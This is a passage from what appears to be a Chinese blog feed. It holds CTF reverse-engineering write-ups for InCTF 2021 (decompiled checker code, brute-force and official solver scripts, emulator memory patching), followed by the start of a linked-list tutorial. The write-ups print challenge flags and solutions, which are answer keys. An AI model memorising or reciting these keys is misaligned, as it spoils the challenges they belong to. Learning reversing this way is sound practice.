class="number">0L</span>L);</span><br><span class="line">    result = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">    *(_WORD *)result = <span class="number">50</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">    *(_WORD *)result = <span class="number">51</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_E33</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(v1) = fork();</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD*)v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    wait(<span class="number">0L</span>L);</span><br><span class="line">    LODWORD(v1) = fork();</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD*)v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      wait(<span class="number">0L</span>L);</span><br><span class="line">      <span class="keyword">if</span> ( fork() )</span><br><span class="line">      &#123;</span><br><span class="line">        wait(<span class="number">0L</span>L);</span><br><span class="line">        LODWORD(v1) = fork();</span><br><span class="line">        <span class="keyword">if</span> ( (_DWORD*)v1 )</span><br><span class="line">        &#123;</span><br><span class="line">          wait(<span class="number">0L</span>L);</span><br><span class="line">          v1 = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">          *(_WORD *)v1 = <span class="number">53</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v1 = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">        *(_WORD *)v1 = <span class="number">51</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_EF4</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(v1) = fork();</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD*)v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    wait(<span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( fork() )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v1) = wait(<span class="number">0L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">      *(_WORD *)v1 = <span class="number">52</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">sub_F59</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fork() )</span><br><span class="line">  &#123;</span><br><span class="line">    wait(<span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( fork() )</span><br><span class="line">    &#123;</span><br><span class="line">      wait(<span class="number">0L</span>L);</span><br><span class="line">      result = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">      *(_WORD *)result = <span class="number">53</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">      *(_WORD *)result = <span class="number">51</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">    *(_WORD *)result = <span class="number">52</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_101C</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(v1) = fork();</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD*)v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    wait(<span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( fork() || fork() )</span><br><span class="line">    &#123;</span><br><span class="line">      wait(<span class="number">0L</span>L);</span><br><span class="line">      wait(<span class="number">0L</span>L);</span><br><span class="line">      v1 = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">      *(_WORD *)v1 = <span class="number">54</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">      *(_WORD *)v1 = <span class="number">52</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_10C6</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(v1) = fork();</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD*)v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    wait(<span class="number">0L</span>L);</span><br><span class="line">    LODWORD(v1) = fork();</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD*)v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      wait(<span class="number">0L</span>L);</span><br><span class="line">      v1 = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">      *(_WORD *)v1 = <span class="number">51</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_1129</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fork() )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) = wait(<span class="number">0L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="keyword">char</span> *)&amp;a1[<span class="built_in">strlen</span>(a1)];</span><br><span class="line">    *(_WORD *)v1 = <span class="number">50</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">func</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *v6;</span><br><span class="line"><span class="keyword">char</span> *dest;</span><br><span class="line"><span class="keyword">char</span> src;</span><br><span class="line"><span class="keyword">__pid_t</span> v4;</span><br><span class="line">FILE *stream;</span><br><span class="line">v6 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x2e4</span>uLL);</span><br><span class="line">dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x2e4</span>uLL);</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">v4= getpid();</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( a1[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        sub_CCE(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        sub_D33(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        sub_DB3(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        sub_E33(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">        sub_EF4(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">        sub_F59(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">        sub_101C(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">        sub_10C6(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>:</span><br><span class="line">        sub_1129(v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">stream = fopen(<span class="string">&quot;check&quot;</span>, <span class="string">&quot;at&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    stream = fopen(<span class="string">&quot;check&quot;</span>, <span class="string">&quot;wt&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Can not open check file for writing.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fputs</span>(v6, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line"><span class="keyword">if</span> ( v4 != getpid() )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">  stream = fopen(<span class="string">&quot;check&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span> ( !stream )</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;Cannot open check file for reading&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> ( src = fgetc(stream); src != <span class="number">-1</span>; src = fgetc(stream) )</span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">strncat</span>(dest, &amp;src, <span class="number">1u</span>LL);</span><br><span class="line">&#125;</span><br><span class="line">remove(<span class="string">&quot;check&quot;</span>) ;</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a,b,c,d,e;</span><br><span class="line"><span class="keyword">char</span> tmp[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">char</span> *code=<span class="built_in">malloc</span>(<span class="number">0x2e4</span>uLL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(a=<span class="string">&#x27;0&#x27;</span>;a&lt;=<span class="string">&#x27;8&#x27;</span>;a++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(b=<span class="string">&#x27;0&#x27;</span>;b&lt;=<span class="string">&#x27;8&#x27;</span>;b++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(c=<span class="string">&#x27;0&#x27;</span>;c&lt;=<span class="string">&#x27;8&#x27;</span>;c++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(d=<span class="string">&#x27;0&#x27;</span>;d&lt;=<span class="string">&#x27;8&#x27;</span>;d++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(e=<span class="string">&#x27;0&#x27;</span>;e&lt;=<span class="string">&#x27;8&#x27;</span>;e++)</span><br><span class="line">&#123;</span><br><span class="line">tmp[<span class="number">0</span>]=a;</span><br><span class="line">tmp[<span class="number">1</span>]=b;</span><br><span class="line">tmp[<span class="number">2</span>]=c;</span><br><span class="line">tmp[<span class="number">3</span>]=d;</span><br><span class="line">tmp[<span class="number">4</span>]=e;</span><br><span class="line">tmp[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,tmp);</span><br><span class="line">code=func(tmp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,code);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">memcmp</span>(code, str,<span class="number">11</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;%s\n&quot;,tmp);</span></span><br><span class="line"><span class="comment">//printf(&quot;%s\n&quot;,code);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本确实有用，但是比较字符串基本没用，因为产生的字符串只能满足大部分相同，并且在看wp时用正确的new数组去生成字符串，也只能满足大部分相同，可能某个地方出了点问题，但用这种方式也确实得到了一些正确字符。</p><pre><code>inctf&#123; MhW1 Y_ 0tv) x) RocA 5E 990 &#125;</code></pre><p>然后就看wp了，看了无名侠师傅的wp，发现其方法是直接patch程序，让输入直接变为4~5个字符然后去调用哪个函数，然后用pwntools交互，打印出所有可能，然后比较。</p><p>最后就直接贴一个官方wp吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">weird_arr = <span class="built_in">open</span>(<span class="string">&quot;flagchecker&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()[<span class="number">0x2020</span>:<span class="number">0x2848</span>]</span><br><span class="line"></span><br><span class="line">pos_vals = [</span><br><span class="line">[[<span class="number">0</span> , <span class="number">6</span>], [<span class="number">8</span> , <span class="number">5</span>], [<span class="number">16</span> , <span class="number">8</span>], [<span class="number">24</span> , <span class="number">3</span>], [<span class="number">31</span> , <span class="number">3</span>],],</span><br><span class="line">[[<span class="number">1</span> , <span class="number">2</span>], [<span class="number">9</span> , <span class="number">6</span>], [<span class="number">17</span> , <span class="number">1</span>], [<span class="number">25</span> , <span class="number">0</span>],],</span><br><span class="line">[[<span class="number">2</span> , <span class="number">0</span>], [<span class="number">10</span> , <span class="number">4</span>], [<span class="number">18</span> , <span class="number">5</span>], [<span class="number">26</span> , <span class="number">2</span>], [<span class="number">32</span> , <span class="number">3</span>],],</span><br><span class="line">[[<span class="number">3</span> , <span class="number">8</span>], [<span class="number">11</span> , <span class="number">5</span>], [<span class="number">19</span> , <span class="number">3</span>], [<span class="number">27</span> , <span class="number">7</span>],],</span><br><span class="line">[[<span class="number">4</span> , <span class="number">3</span>], [<span class="number">12</span> , <span class="number">8</span>], [<span class="number">20</span> , <span class="number">3</span>], [<span class="number">28</span> , <span class="number">8</span>], [<span class="number">33</span> , <span class="number">3</span>],],</span><br><span class="line">[[<span class="number">5</span> , <span class="number">6</span>], [<span class="number">13</span> , <span class="number">5</span>], [<span class="number">21</span> , <span class="number">5</span>], [<span class="number">29</span> , <span class="number">6</span>],],</span><br><span class="line">[[<span class="number">6</span> , <span class="number">1</span>], [<span class="number">14</span> , <span class="number">0</span>], [<span class="number">22</span> , <span class="number">4</span>], [<span class="number">30</span> , <span class="number">2</span>], [<span class="number">34</span> , <span class="number">5</span>],],</span><br><span class="line">[[<span class="number">7</span> , <span class="number">5</span>], [<span class="number">15</span> , <span class="number">3</span>], [<span class="number">23</span> , <span class="number">1</span>], [<span class="number">35</span> , <span class="number">8</span>],],</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">checks = [</span><br><span class="line"><span class="string">&#x27;84721&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1138&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;80481&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;7786&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;57518&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2445&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;02162&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1854&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">36</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(checks)):</span><br><span class="line">    chk = checks[i]</span><br><span class="line">    psv = pos_vals[i]</span><br><span class="line"></span><br><span class="line">    print(psv)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chk)):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(weird_arr[<span class="built_in">int</span>(<span class="built_in">str</span>(ch),<span class="number">16</span>)]) == chk[x]:</span><br><span class="line">                <span class="keyword">if</span> (ch % <span class="number">9</span>) == psv[x][<span class="number">1</span>]:</span><br><span class="line">                    <span class="comment"># print(chr(ch))</span></span><br><span class="line">                    flag[psv[x][<span class="number">0</span>]] = <span class="built_in">chr</span>(ch)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line"><span class="comment">#inctf&#123;vM_W1ht_l0t7_0f_pRoces5ES9902&#125;</span></span><br></pre></td></tr></table></figure><h2 id="REplica"><a href="#REplica" class="headerlink" title="REplica"></a>REplica</h2><p>rust，之前见过一次，确实难看，根据题目来看，应该是换位。</p><p>然后ida看了看，能确定字符长度是25，但当时就是不知道怎么输入，后来看wp才知道是命令行输入，对于命令行输入如何调试还没想好，应该是是main函数传入的参数，但是暂时没去实践。</p><h2 id="Adventures-of-Lonely-Knight"><a href="#Adventures-of-Lonely-Knight" class="headerlink" title="Adventures of Lonely Knight"></a>Adventures of Lonely Knight</h2><p>nes，全新的知识点，参考无名侠wp<a href="https://panda0s.top/2021/08/16/InCTF2021/">https://panda0s.top/2021/08/16/InCTF2021/</a>，去下载模拟器调了调。虽然没完全搞懂，但是也比较好玩。</p><p>用模拟器打开文件，用手柄的start开始游戏，键盘居然还晓不得哪个是开始，游戏过程大概就是打怪，吃心心，捡钥匙进入下一关，但是玩了一会你就会发现，结果都是you died，也比较奇怪这道题也没说过关条件，不像mrctf的游戏，给了过关条件。</p><p>然后去找一些地址代表的意思，如下，调很多次就能发现主要代码就在0xA200的后面。<br><img src="https://i.loli.net/2021/08/16/cPhgyoEjV3tK4Fz.png"><br>重点来说一下0x5C的几个值的意思吧，因为0x68的key分析不来，不知道为什么非0就可以得到flag。如果要分析死亡条件，由于调试时人不能动，但是游戏中的怪会随着调试自动移动，我就想下几个断点，看看判断条件是什么，结果也没看到什么cmp。</p><p>当0x5C的值为1，就是正常的游戏过程。</p><p>当0x5C的值为3，结束屏幕会闪。</p><p>当0x5C的值为4，会冒出一个通关的界面。<br><img src="https://i.loli.net/2021/08/16/YgZMDGrS1IUF7vo.png"><br>当0x5C的值为5，弹出you died界面，我也是通过每次死亡后发现这个地址的值都会变为5，从而特地分析的什么改变了0x5C地址的值。</p><p>最后就贴一个直接改key的成功得到flag界面吧，还会变色，估计和0x5C=3有关。<br><img src="https://i.loli.net/2021/08/16/rMJKEThLlP3xuDy.png"><br><code>INCTF&#123;LONELY_BOY_1E23&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构 learn</title>
      <link href="2021/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%20learning/"/>
      <url>2021/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%20learning/</url>
      
        <content type="html"><![CDATA[<h1 id="数据结构-learn"><a href="#数据结构-learn" class="headerlink" title="数据结构 learn"></a>数据结构 learn</h1><p>学了差不多10多天的数据结构，还有很多小章节没学，但是收获还是挺大的。</p><h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><h3 id="线性表的顺序储存结构"><a href="#线性表的顺序储存结构" class="headerlink" title="线性表的顺序储存结构"></a>线性表的顺序储存结构</h3><p>说白了就是类似于结构体数组，或者直接就是数组，例子在<a href="https://the_itach1.gitee.io/2021/07/28/c++/">c++ learn</a>文章的实战-通讯录管理资料。</p><p>优点：</p><ul><li>无须为表中元素之间的逻辑关系而增加额外的储存空间。</li><li>可以快速的取表中任意位置的元素。</li></ul><p>缺点</p><ul><li>插入和删除操作需要移动大量元素</li><li>当线性表长度变化较大时，难以确定存储空间的容量</li><li>造成存储空间的“碎片”</li></ul><h3 id="线性表的链式存储结构"><a href="#线性表的链式存储结构" class="headerlink" title="线性表的链式存储结构"></a>线性表的链式存储结构</h3><p>就是链表</p><h4 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h4><p>主要学习如何生成链表，插入数据，头插法，尾插法，如何删除数据，如何删除链表。</p><p>自己写的一个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> date;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;Node,*List;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creathead</span><span class="params">(List *<span class="built_in">list</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*<span class="built_in">list</span> = (List)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">(*<span class="built_in">list</span>)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getlistlen</span><span class="params">(List head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">List p;</span><br><span class="line">p = head-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (p)</span><br><span class="line">&#123;</span><br><span class="line">i++;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creatlist1</span><span class="params">(List head, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">List p,q;</span><br><span class="line">q = head;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = (List)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">p-&gt;date = i;</span><br><span class="line">q-&gt;next = p;</span><br><span class="line">q = p;</span><br><span class="line">&#125;</span><br><span class="line">q-&gt;next = <span 